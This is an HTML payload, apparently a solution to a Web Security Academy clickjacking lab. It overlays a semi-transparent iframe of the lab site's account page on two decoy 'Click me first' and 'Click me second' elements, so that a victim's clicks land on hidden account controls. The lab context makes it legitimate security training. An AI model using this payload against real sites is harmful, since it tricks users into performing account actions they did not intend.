#use the following HTML
<style>

        iframe {
            position: relative;
            width: 500px;
            height: 700px;
            opacity: 0.3;
            z-index: 2;
        }

        #first {
            position: absolute;
            top: 265px;
            left: 60px;
            z-index: 1;
        }

        #second {
            position: absolute;
            top: 265px;
            left: 200px;
            z-index: 1;
        }

</style>

    <div id="first">Click me first</div>
    <div id="second">Click me second</div>
    <iframe src="https://acf71f351ed2a105806d0d9f0054003f.web-security-academy.net/account"></iframe>

